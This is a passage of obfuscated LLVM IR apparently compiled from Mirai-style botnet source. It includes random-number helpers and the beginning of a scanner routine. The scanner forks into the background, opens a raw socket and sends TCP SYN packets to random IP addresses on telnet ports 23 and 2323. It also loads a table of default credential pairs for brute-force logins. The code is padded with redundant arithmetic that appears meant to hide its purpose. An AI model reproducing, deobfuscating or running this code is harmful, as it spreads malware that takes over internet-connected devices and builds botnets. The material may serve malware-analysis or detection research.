  %58 = xor i32 65535, -1
  %59 = xor i32 840168683, -1
  %60 = or i32 %57, %58
  %61 = or i32 840168683, %59
  %62 = xor i32 %60, -1
  %63 = and i32 %62, %61
  %64 = and i32 %56, 65535
  %65 = load i32, i32* %12, align 4
  %66 = sub i32 %65, 2055453964
  %67 = add i32 %66, %63
  %68 = add i32 %67, 2055453964
  %69 = add i32 %65, %63
  store i32 %68, i32* %12, align 4
  %70 = load i32, i32* %10, align 4
  %71 = xor i32 65535, -1
  %72 = xor i32 %70, %71
  %73 = and i32 %72, %70
  %74 = and i32 %70, 65535
  %75 = load i32, i32* %12, align 4
  %76 = add i32 %75, -1086139115
  %77 = add i32 %76, %73
  %78 = sub i32 %77, -1086139115
  %79 = add i32 %75, %73
  store i32 %78, i32* %12, align 4
  %80 = load i32, i32* %11, align 4
  %81 = lshr i32 %80, 16
  %82 = xor i32 65535, -1
  %83 = xor i32 %81, %82
  %84 = and i32 %83, %81
  %85 = and i32 %81, 65535
  %86 = load i32, i32* %12, align 4
  %87 = sub i32 %86, -14857142
  %88 = add i32 %87, %84
  %89 = add i32 %88, -14857142
  %90 = add i32 %86, %84
  store i32 %89, i32* %12, align 4
  %91 = load i32, i32* %11, align 4
  %92 = xor i32 %91, -1
  %93 = xor i32 65535, -1
  %94 = xor i32 1534805224, -1
  %95 = or i32 %92, %93
  %96 = or i32 1534805224, %94
  %97 = xor i32 %95, -1
  %98 = and i32 %97, %96
  %99 = and i32 %91, 65535
  %100 = load i32, i32* %12, align 4
  %101 = add i32 %100, -1637063664
  %102 = add i32 %101, %98
  %103 = sub i32 %102, -1637063664
  %104 = add i32 %100, %98
  store i32 %103, i32* %12, align 4
  %105 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %106 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %105, i32 0, i32 6
  %107 = load i8, i8* %106, align 1
  %108 = zext i8 %107 to i16
  %109 = call zeroext i16 @htons(i16 zeroext %108) #7
  %110 = zext i16 %109 to i32
  %111 = load i32, i32* %12, align 4
  %112 = sub i32 0, %111
  %113 = sub i32 0, %110
  %114 = add i32 %112, %113
  %115 = sub i32 0, %114
  %116 = add i32 %111, %110
  store i32 %115, i32* %12, align 4
  %117 = load i16, i16* %7, align 2
  %118 = zext i16 %117 to i32
  %119 = load i32, i32* %12, align 4
  %120 = sub i32 0, %119
  %121 = sub i32 0, %118
  %122 = add i32 %120, %121
  %123 = sub i32 0, %122
  %124 = add i32 %119, %118
  store i32 %123, i32* %12, align 4
  br label %125

; <label>:125:                                    ; preds = %129, %54
  %126 = load i32, i32* %12, align 4
  %127 = lshr i32 %126, 16
  %128 = icmp ne i32 %127, 0
  br i1 %128, label %129, label %140

; <label>:129:                                    ; preds = %125
  %130 = load i32, i32* %12, align 4
  %131 = xor i32 65535, -1
  %132 = xor i32 %130, %131
  %133 = and i32 %132, %130
  %134 = and i32 %130, 65535
  %135 = load i32, i32* %12, align 4
  %136 = lshr i32 %135, 16
  %137 = sub i32 0, %136
  %138 = sub i32 %133, %137
  %139 = add i32 %133, %136
  store i32 %138, i32* %12, align 4
  br label %125

; <label>:140:                                    ; preds = %125
  %141 = load i32, i32* %12, align 4
  %142 = xor i32 %141, -1
  %143 = and i32 685375312, %142
  %144 = xor i32 685375312, -1
  %145 = and i32 %141, %144
  %146 = xor i32 -1, -1
  %147 = and i32 %146, 685375312
  %148 = and i32 -1, %144
  %149 = or i32 %143, %145
  %150 = or i32 %147, %148
  %151 = xor i32 %149, %150
  %152 = xor i32 %141, -1
  %153 = trunc i32 %151 to i16
  ret i16 %153
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_next() #0 {
  %1 = alloca i32, align 4
  %2 = load i32, i32* @x, align 4
  store i32 %2, i32* %1, align 4
  %3 = load i32, i32* %1, align 4
  %4 = shl i32 %3, 11
  %5 = load i32, i32* %1, align 4
  %6 = xor i32 %5, -1
  %7 = and i32 %4, %6
  %8 = xor i32 %4, -1
  %9 = and i32 %5, %8
  %10 = or i32 %7, %9
  %11 = xor i32 %5, %4
  store i32 %10, i32* %1, align 4
  %12 = load i32, i32* %1, align 4
  %13 = lshr i32 %12, 8
  %14 = load i32, i32* %1, align 4
  %15 = xor i32 %14, -1
  %16 = and i32 1592741751, %15
  %17 = xor i32 1592741751, -1
  %18 = and i32 %14, %17
  %19 = xor i32 %13, -1
  %20 = and i32 %19, 1592741751
  %21 = and i32 %13, %17
  %22 = or i32 %16, %18
  %23 = or i32 %20, %21
  %24 = xor i32 %22, %23
  %25 = xor i32 %14, %13
  store i32 %24, i32* %1, align 4
  %26 = load i32, i32* @y, align 4
  store i32 %26, i32* @x, align 4
  %27 = load i32, i32* @z, align 4
  store i32 %27, i32* @y, align 4
  %28 = load i32, i32* @w, align 4
  store i32 %28, i32* @z, align 4
  %29 = load i32, i32* @w, align 4
  %30 = lshr i32 %29, 19
  %31 = load i32, i32* @w, align 4
  %32 = xor i32 %31, -1
  %33 = and i32 %30, %32
  %34 = xor i32 %30, -1
  %35 = and i32 %31, %34
  %36 = or i32 %33, %35
  %37 = xor i32 %31, %30
  store i32 %36, i32* @w, align 4
  %38 = load i32, i32* %1, align 4
  %39 = load i32, i32* @w, align 4
  %40 = xor i32 %39, -1
  %41 = and i32 %38, %40
  %42 = xor i32 %38, -1
  %43 = and i32 %39, %42
  %44 = or i32 %41, %43
  %45 = xor i32 %39, %38
  store i32 %44, i32* @w, align 4
  %46 = load i32, i32* @w, align 4
  ret i32 %46
}

; Function Attrs: noinline nounwind uwtable
define void @rand_str(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  br label %5

; <label>:5:                                      ; preds = %64, %2
  %6 = load i32, i32* %4, align 4
  %7 = icmp sgt i32 %6, 0
  br i1 %7, label %8, label %65

; <label>:8:                                      ; preds = %5
  %9 = load i32, i32* %4, align 4
  %10 = icmp sge i32 %9, 4
  br i1 %10, label %11, label %24

; <label>:11:                                     ; preds = %8
  %12 = call i32 @rand_next()
  %13 = load i8*, i8** %3, align 8
  %14 = bitcast i8* %13 to i32*
  store i32 %12, i32* %14, align 4
  %15 = load i8*, i8** %3, align 8
  %16 = getelementptr inbounds i8, i8* %15, i64 4
  store i8* %16, i8** %3, align 8
  %17 = load i32, i32* %4, align 4
  %18 = sext i32 %17 to i64
  %19 = add i64 %18, -4119607665454459312
  %20 = sub i64 %19, 4
  %21 = sub i64 %20, -4119607665454459312
  %22 = sub i64 %18, 4
  %23 = trunc i64 %21 to i32
  store i32 %23, i32* %4, align 4
  br label %64

; <label>:24:                                     ; preds = %8
  %25 = load i32, i32* %4, align 4
  %26 = icmp sge i32 %25, 2
  br i1 %26, label %27, label %45

; <label>:27:                                     ; preds = %24
  %28 = call i32 @rand_next()
  %29 = xor i32 65535, -1
  %30 = xor i32 %28, %29
  %31 = and i32 %30, %28
  %32 = and i32 %28, 65535
  %33 = trunc i32 %31 to i16
  %34 = load i8*, i8** %3, align 8
  %35 = bitcast i8* %34 to i16*
  store i16 %33, i16* %35, align 2
  %36 = load i8*, i8** %3, align 8
  %37 = getelementptr inbounds i8, i8* %36, i64 2
  store i8* %37, i8** %3, align 8
  %38 = load i32, i32* %4, align 4
  %39 = sext i32 %38 to i64
  %40 = add i64 %39, 8675088895087817904
  %41 = sub i64 %40, 2
  %42 = sub i64 %41, 8675088895087817904
  %43 = sub i64 %39, 2
  %44 = trunc i64 %42 to i32
  store i32 %44, i32* %4, align 4
  br label %63

; <label>:45:                                     ; preds = %24
  %46 = call i32 @rand_next()
  %47 = xor i32 %46, -1
  %48 = xor i32 255, -1
  %49 = xor i32 651981383, -1
  %50 = or i32 %47, %48
  %51 = or i32 651981383, %49
  %52 = xor i32 %50, -1
  %53 = and i32 %52, %51
  %54 = and i32 %46, 255
  %55 = trunc i32 %53 to i8
  %56 = load i8*, i8** %3, align 8
  %57 = getelementptr inbounds i8, i8* %56, i32 1
  store i8* %57, i8** %3, align 8
  store i8 %55, i8* %56, align 1
  %58 = load i32, i32* %4, align 4
  %59 = sub i32 %58, 1422268005
  %60 = add i32 %59, -1
  %61 = add i32 %60, 1422268005
  %62 = add nsw i32 %58, -1
  store i32 %61, i32* %4, align 4
  br label %63

; <label>:63:                                     ; preds = %45, %27
  br label %64

; <label>:64:                                     ; preds = %63, %11
  br label %5

; <label>:65:                                     ; preds = %5
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @rand_alpha_str(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [32 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  call void @table_unlock_val(i8 zeroext 28)
  %6 = getelementptr inbounds [32 x i8], [32 x i8]* %5, i32 0, i32 0
  %7 = call i8* @table_retrieve_val(i32 28, i32* null)
  %8 = call i8* @strcpy(i8* %6, i8* %7) #6
  br label %9

; <label>:9:                                      ; preds = %17, %2
  %10 = load i32, i32* %4, align 4
  %11 = sub i32 0, %10
  %12 = sub i32 0, -1
  %13 = add i32 %11, %12
  %14 = sub i32 0, %13
  %15 = add nsw i32 %10, -1
  store i32 %14, i32* %4, align 4
  %16 = icmp ne i32 %10, 0
  br i1 %16, label %17, label %27

; <label>:17:                                     ; preds = %9
  %18 = call i32 @rand_next()
  %19 = getelementptr inbounds [32 x i8], [32 x i8]* %5, i32 0, i32 0
  %20 = call i32 @util_strlen(i8* %19)
  %21 = urem i32 %18, %20
  %22 = zext i32 %21 to i64
  %23 = getelementptr inbounds [32 x i8], [32 x i8]* %5, i64 0, i64 %22
  %24 = load i8, i8* %23, align 1
  %25 = load i8*, i8** %3, align 8
  %26 = getelementptr inbounds i8, i8* %25, i32 1
  store i8* %26, i8** %3, align 8
  store i8 %24, i8* %25, align 1
  br label %9

; <label>:27:                                     ; preds = %9
  call void @table_lock_val(i8 zeroext 28)
  ret void
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @scanner_init() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i16, align 2
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.fd_set.26, align 8
  %6 = alloca %struct.fd_set.26, align 8
  %7 = alloca %struct.scanner_connection*, align 8
  %8 = alloca %struct.timeval.27, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.sockaddr_in, align 4
  %15 = alloca %struct.iphdr*, align 8
  %16 = alloca %struct.tcphdr*, align 8
  %17 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %18 = alloca i32, align 4
  %19 = alloca [1514 x i8], align 16
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.tcphdr*, align 8
  %22 = alloca %struct.scanner_connection*, align 8
  %23 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  %34 = alloca i8*, align 8
  %35 = alloca i32, align 4
  %36 = alloca i8*, align 8
  %37 = alloca i32, align 4
  %38 = alloca i8*, align 8
  %39 = alloca i32, align 4
  %40 = alloca i8*, align 8
  %41 = alloca i32, align 4
  %42 = alloca i8*, align 8
  %43 = alloca i32, align 4
  %44 = alloca i8*, align 8
  %45 = alloca i32, align 4
  %46 = call i32 @fork() #6
  store i32 %46, i32* @scanner_pid, align 4
  %47 = load i32, i32* @scanner_pid, align 4
  %48 = icmp sgt i32 %47, 0
  br i1 %48, label %52, label %49

; <label>:49:                                     ; preds = %0
  %50 = load i32, i32* @scanner_pid, align 4
  %51 = icmp eq i32 %50, -1
  br i1 %51, label %52, label %53

; <label>:52:                                     ; preds = %49, %0
  ret void

; <label>:53:                                     ; preds = %49
  %54 = call i32 @util_local_addr()
  store i32 %54, i32* @LOCAL_ADDR, align 4
  call void @rand_init()
  %55 = call i64 @time(i64* null) #6
  %56 = trunc i64 %55 to i32
  store i32 %56, i32* @fake_time, align 4
  %57 = call noalias i8* @calloc(i64 256, i64 296) #6
  %58 = bitcast i8* %57 to %struct.scanner_connection*
  store %struct.scanner_connection* %58, %struct.scanner_connection** @conn_table, align 8
  store i32 0, i32* %1, align 4
  br label %59

; <label>:59:                                     ; preds = %73, %53
  %60 = load i32, i32* %1, align 4
  %61 = icmp slt i32 %60, 256
  br i1 %61, label %62, label %80

; <label>:62:                                     ; preds = %59
  %63 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %64 = load i32, i32* %1, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %63, i64 %65
  %67 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %66, i32 0, i32 3
  store i32 0, i32* %67, align 8
  %68 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %69 = load i32, i32* %1, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %68, i64 %70
  %72 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %71, i32 0, i32 1
  store i32 -1, i32* %72, align 8
  br label %73

; <label>:73:                                     ; preds = %62
  %74 = load i32, i32* %1, align 4
  %75 = sub i32 0, %74
  %76 = sub i32 0, 1
  %77 = add i32 %75, %76
  %78 = sub i32 0, %77
  %79 = add nsw i32 %74, 1
  store i32 %78, i32* %1, align 4
  br label %59

; <label>:80:                                     ; preds = %59
  %81 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %81, i32* @rsck, align 4
  %82 = icmp eq i32 %81, -1
  br i1 %82, label %83, label %84

; <label>:83:                                     ; preds = %80
  call void @exit(i32 0) #8
  unreachable

; <label>:84:                                     ; preds = %80
  %85 = load i32, i32* @rsck, align 4
  %86 = load i32, i32* @rsck, align 4
  %87 = call i32 (i32, i32, ...) @fcntl(i32 %86, i32 3, i32 0)
  %88 = and i32 2048, %87
  %89 = xor i32 2048, %87
  %90 = or i32 %88, %89
  %91 = or i32 2048, %87
  %92 = call i32 (i32, i32, ...) @fcntl(i32 %85, i32 4, i32 %90)
  store i32 1, i32* %1, align 4
  %93 = load i32, i32* @rsck, align 4
  %94 = bitcast i32* %1 to i8*
  %95 = call i32 @setsockopt(i32 %93, i32 0, i32 3, i8* %94, i32 4) #6
  %96 = icmp ne i32 %95, 0
  br i1 %96, label %97, label %100

; <label>:97:                                     ; preds = %84
  %98 = load i32, i32* @rsck, align 4
  %99 = call i32 @close(i32 %98)
  call void @exit(i32 0) #8
  unreachable

; <label>:100:                                    ; preds = %84
  br label %101

; <label>:101:                                    ; preds = %112, %100
  %102 = call i32 @rand_next()
  %103 = xor i32 %102, -1
  %104 = xor i32 65535, -1
  %105 = xor i32 1337375954, -1
  %106 = or i32 %103, %104
  %107 = or i32 1337375954, %105
  %108 = xor i32 %106, -1
  %109 = and i32 %108, %107
  %110 = and i32 %102, 65535
  %111 = trunc i32 %109 to i16
  store i16 %111, i16* %2, align 2
  br label %112

; <label>:112:                                    ; preds = %101
  %113 = load i16, i16* %2, align 2
  %114 = call zeroext i16 @ntohs(i16 zeroext %113) #7
  %115 = zext i16 %114 to i32
  %116 = icmp slt i32 %115, 1024
  br i1 %116, label %101, label %117

; <label>:117:                                    ; preds = %112
  store %struct.iphdr* bitcast ([40 x i8]* @scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %3, align 8
  %118 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %119 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %118, i64 1
  %120 = bitcast %struct.iphdr* %119 to %struct.tcphdr*
  store %struct.tcphdr* %120, %struct.tcphdr** %4, align 8
  %121 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %122 = bitcast %struct.iphdr* %121 to i8*
  %123 = load i8, i8* %122, align 4
  %124 = xor i8 -16, -1
  %125 = xor i8 %123, %124
  %126 = and i8 %125, %123
  %127 = and i8 %123, -16
  %128 = and i8 %126, 5
  %129 = xor i8 %126, 5
  %130 = or i8 %128, %129
  %131 = or i8 %126, 5
  store i8 %130, i8* %122, align 4
  %132 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %133 = bitcast %struct.iphdr* %132 to i8*
  %134 = load i8, i8* %133, align 4
  %135 = xor i8 15, -1
  %136 = xor i8 %134, %135
  %137 = and i8 %136, %134
  %138 = and i8 %134, 15
  %139 = and i8 %137, 64
  %140 = xor i8 %137, 64
  %141 = or i8 %139, %140
  %142 = or i8 %137, 64
  store i8 %141, i8* %133, align 4
  %143 = call zeroext i16 @htons(i16 zeroext 40) #7
  %144 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %145 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %144, i32 0, i32 2
  store i16 %143, i16* %145, align 2
  %146 = call i32 @rand_next()
  %147 = trunc i32 %146 to i16
  %148 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %149 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %148, i32 0, i32 3
  store i16 %147, i16* %149, align 4
  %150 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %151 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %150, i32 0, i32 5
  store i8 64, i8* %151, align 4
  %152 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %153 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %152, i32 0, i32 6
  store i8 6, i8* %153, align 1
  %154 = call zeroext i16 @htons(i16 zeroext 23) #7
  %155 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %156 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %155, i32 0, i32 1
  store i16 %154, i16* %156, align 2
  %157 = load i16, i16* %2, align 2
  %158 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %159 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %158, i32 0, i32 0
  store i16 %157, i16* %159, align 4
  %160 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %161 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %160, i32 0, i32 4
  %162 = load i16, i16* %161, align 4
  %163 = xor i16 %162, -1
  %164 = xor i16 -241, -1
  %165 = xor i16 -13396, -1
  %166 = or i16 %163, %164
  %167 = or i16 -13396, %165
  %168 = xor i16 %166, -1
  %169 = and i16 %168, %167
  %170 = and i16 %162, -241
  %171 = and i16 %169, 80
  %172 = xor i16 %169, 80
  %173 = or i16 %171, %172
  %174 = or i16 %169, 80
  store i16 %173, i16* %161, align 4
  %175 = call i32 @rand_next()
  %176 = xor i32 65535, -1
  %177 = xor i32 %175, %176
  %178 = and i32 %177, %175
  %179 = and i32 %175, 65535
  %180 = trunc i32 %178 to i16
  %181 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %182 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %181, i32 0, i32 5
  store i16 %180, i16* %182, align 2
  %183 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %184 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %183, i32 0, i32 4
  %185 = load i16, i16* %184, align 4
  %186 = xor i16 %185, -1
  %187 = xor i16 -513, -1
  %188 = xor i16 -15688, -1
  %189 = or i16 %186, %187
  %190 = or i16 -15688, %188
  %191 = xor i16 %189, -1
  %192 = and i16 %191, %190
  %193 = and i16 %185, -513
  %194 = and i16 %192, 512
  %195 = xor i16 %192, 512
  %196 = or i16 %194, %195
  %197 = or i16 %192, 512
  store i16 %196, i16* %184, align 4
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.1, i32 0, i32 0), i16 zeroext 4)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.2, i32 0, i32 0), i16 zeroext 8)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.3, i32 0, i32 0), i16 zeroext 12)
  call void @add_auth_entry(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i32 0, i32 0), i16 zeroext 12)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.1, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i32 0, i32 0), i16 zeroext 12)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.7, i32 0, i32 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.8, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.9, i32 0, i32 0), i16 zeroext 14)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i32 0, i32 0), i16 zeroext 11)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.10, i32 0, i32 0), i16 zeroext 17)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.11, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i32 0, i32 0), i16 zeroext 8)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.11, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.13, i32 0, i32 0), i16 zeroext 15)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.14, i32 0, i32 0), i16 zeroext 15)
  br label %198

; <label>:198:                                    ; preds = %1118, %117
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %199 = load i32, i32* @fake_time, align 4
  %200 = load i32, i32* %10, align 4
  %201 = icmp ne i32 %199, %200
  br i1 %201, label %202, label %279

; <label>:202:                                    ; preds = %198
  %203 = load i32, i32* @fake_time, align 4
  store i32 %203, i32* %10, align 4
  store i32 0, i32* %1, align 4
  br label %204

; <label>:204:                                    ; preds = %271, %202
  %205 = load i32, i32* %1, align 4
  %206 = icmp slt i32 %205, 384
  br i1 %206, label %207, label %278

; <label>:207:                                    ; preds = %204
  %208 = bitcast %struct.sockaddr_in* %14 to i8*
  call void @llvm.memset.p0i8.i64(i8* %208, i8 0, i64 16, i32 4, i1 false)
  store %struct.iphdr* bitcast ([40 x i8]* @scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %15, align 8
  %209 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %210 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %209, i64 1
  %211 = bitcast %struct.iphdr* %210 to %struct.tcphdr*
  store %struct.tcphdr* %211, %struct.tcphdr** %16, align 8
  %212 = call i32 @rand_next()
  %213 = trunc i32 %212 to i16
  %214 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %215 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %214, i32 0, i32 3
  store i16 %213, i16* %215, align 4
  %216 = load i32, i32* @LOCAL_ADDR, align 4
  %217 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %218 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %217, i32 0, i32 8
  store i32 %216, i32* %218, align 4
  %219 = call i32 @get_random_ip()
  %220 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %221 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %220, i32 0, i32 9
  store i32 %219, i32* %221, align 4
  %222 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %223 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %222, i32 0, i32 7
  store i16 0, i16* %223, align 2
  %224 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %225 = bitcast %struct.iphdr* %224 to i16*
  %226 = call zeroext i16 @checksum_generic(i16* %225, i32 20)
  %227 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %228 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %227, i32 0, i32 7
  store i16 %226, i16* %228, align 2
  %229 = load i32, i32* %1, align 4
  %230 = srem i32 %229, 10
  %231 = icmp eq i32 %230, 0
  br i1 %231, label %232, label %236

; <label>:232:                                    ; preds = %207
  %233 = call zeroext i16 @htons(i16 zeroext 2323) #7
  %234 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %235 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %234, i32 0, i32 1
  store i16 %233, i16* %235, align 2
  br label %240

; <label>:236:                                    ; preds = %207
  %237 = call zeroext i16 @htons(i16 zeroext 23) #7
  %238 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %239 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %238, i32 0, i32 1
  store i16 %237, i16* %239, align 2
  br label %240

; <label>:240:                                    ; preds = %236, %232
  %241 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %242 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %241, i32 0, i32 9
  %243 = load i32, i32* %242, align 4
  %244 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %245 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %244, i32 0, i32 2
  store i32 %243, i32* %245, align 4
  %246 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %247 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %246, i32 0, i32 6
  store i16 0, i16* %247, align 4
  %248 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %249 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %250 = bitcast %struct.tcphdr* %249 to i8*
  %251 = call zeroext i16 @htons(i16 zeroext 20) #7
  %252 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %248, i8* %250, i16 zeroext %251, i32 20)
  %253 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %254 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %253, i32 0, i32 6
  store i16 %252, i16* %254, align 4
  %255 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 0
  store i16 2, i16* %255, align 4
  %256 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %257 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %256, i32 0, i32 9
  %258 = load i32, i32* %257, align 4
  %259 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  %260 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %259, i32 0, i32 0
  store i32 %258, i32* %260, align 4
  %261 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %262 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %261, i32 0, i32 1
  %263 = load i16, i16* %262, align 2
  %264 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  store i16 %263, i16* %264, align 2
  %265 = load i32, i32* @rsck, align 4
  %266 = bitcast %union.__CONST_SOCKADDR_ARG* %17 to %struct.sockaddr**
  %267 = bitcast %struct.sockaddr_in* %14 to %struct.sockaddr*
  store %struct.sockaddr* %267, %struct.sockaddr** %266, align 8
  %268 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %17, i32 0, i32 0
  %269 = load %struct.sockaddr*, %struct.sockaddr** %268, align 8
  %270 = call i64 @sendto(i32 %265, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i32 0, i32 0), i64 40, i32 16384, %struct.sockaddr* %269, i32 16)
  br label %271

; <label>:271:                                    ; preds = %240
  %272 = load i32, i32* %1, align 4
  %273 = sub i32 0, %272
  %274 = sub i32 0, 1
  %275 = add i32 %273, %274
  %276 = sub i32 0, %275
  %277 = add nsw i32 %272, 1
  store i32 %276, i32* %1, align 4
  br label %204

; <label>:278:                                    ; preds = %204
  br label %279

; <label>:279:                                    ; preds = %278, %198
  store i32 0, i32* %9, align 4
  br label %280

